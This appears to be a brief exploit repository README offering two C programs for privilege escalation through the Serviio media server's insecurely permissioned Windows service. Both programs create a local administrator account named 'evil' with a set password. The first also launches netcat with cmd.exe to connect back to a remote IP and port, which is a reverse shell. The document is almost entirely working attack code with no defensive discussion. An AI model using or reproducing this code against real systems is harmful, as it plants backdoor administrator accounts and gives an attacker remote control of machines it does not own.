# ServiioService_PrivEsc
privilege escalation for Serviio running insecure file permissions on services that run as nt authority\system


#include <stdlib.h>

int main ()
{
	int i;
    i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");
    i = system ("cd C:\\Tools\\practical_tools ");
	i = system ("nc.exe 192.168.119.199 4444 -e cmd.exe");

	return 0;
}

# ServiioService_PrivEsc - Second example 

#include <stdlib.h>
int main ()
{
	int i;
    i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");
	return 0;
}

